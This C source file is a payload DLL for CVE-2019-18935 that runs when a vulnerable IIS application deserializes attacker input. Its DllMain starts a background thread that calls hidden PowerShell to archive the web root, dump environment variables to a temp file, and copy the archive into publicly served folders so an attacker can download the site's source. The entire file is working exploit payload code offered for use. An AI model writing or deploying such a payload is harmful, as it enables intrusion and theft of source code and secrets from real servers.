#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * dump-src.c — payload DLL for CVE-2019-18935.
 * When loaded via deserialization, this runs as the IIS app-pool identity and:
 *   1. Zips the web root (C:\inetpub\wwwroot) into src.zip
 *   2. Tries to place src.zip in several publicly-served locations so the
 *      attacker can just download it in a browser:
 *        - C:\inetpub\wwwroot\src.zip           ->  http://HOST:82/src.zip
 *        - C:\inetpub\wwwroot\StartUp\src.zip   ->  http://HOST:82/StartUp/src.zip
 *        - C:\Windows\Temp\src.zip              ->  (fallback, needs copy)
 *   3. Also dumps `set` (environment) into C:\Windows\Temp\env.txt
 *
 * All work is done on a background thread so the web request returns fast.
 */

static DWORD WINAPI DumpThread(LPVOID lpParam)
{
    (void)lpParam;

    // Give the deserialization request a moment to finish cleanly.
    Sleep(500);

    // 1) Try zipping common web roots with PowerShell.
    const char *roots[] = {
        "C:\\inetpub\\wwwroot",
        "C:\\inetpub\\wwwroot\\StartUp",
        "C:\\inetpub\\vhosts",           // Plesk layout, just in case
        NULL
    };
    for (int i = 0; roots[i]; i++) {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
            "powershell -NoProfile -WindowStyle Hidden -Command \""
            "try { Compress-Archive -Path '%s\\*' -DestinationPath 'C:\\Windows\\Temp\\src.zip' -Force -ErrorAction Stop }"
            " catch { exit 1 }\"", roots[i]);
        // Synchronous is fine here; the thread is already backgrounded.
        system(cmd);
        // If the zip exists after this attempt, stop trying other roots.
        FILE *f = fopen("C:\\Windows\\Temp\\src.zip", "rb");
        if (f) {
            long sz = 0;
            fseek(f, 0, SEEK_END); sz = ftell(f); fclose(f);
            if (sz > 1000) break;   // looks like a real archive
            remove("C:\\Windows\\Temp\\src.zip");
        }
    }

    // 2) Dump environment as well.
    system("powershell -NoProfile -WindowStyle Hidden -Command \""
           "Get-ChildItem Env: | Format-Table -AutoSize | Out-File -FilePath 'C:\\Windows\\Temp\\env.txt' -Encoding UTF8\"");

    // 3) Distribute src.zip to publicly readable locations.
    system("powershell -NoProfile -WindowStyle Hidden -Command \""
           "foreach ($d in @('C:\\inetpub\\wwwroot', 'C:\\inetpub\\wwwroot\\StartUp', 'C:\\inetpub\\vhosts\\default\\htdocs')) { "
           "  try { Copy-Item 'C:\\Windows\\Temp\\src.zip' (Join-Path $d 'src.zip') -Force -ErrorAction Stop; "
           "        (Get-Item (Join-Path $d 'src.zip')).LastWriteTime = Get-Date } catch {} }\"");

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        hThread = CreateThread(0, 0, DumpThread, 0, 0, 0);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
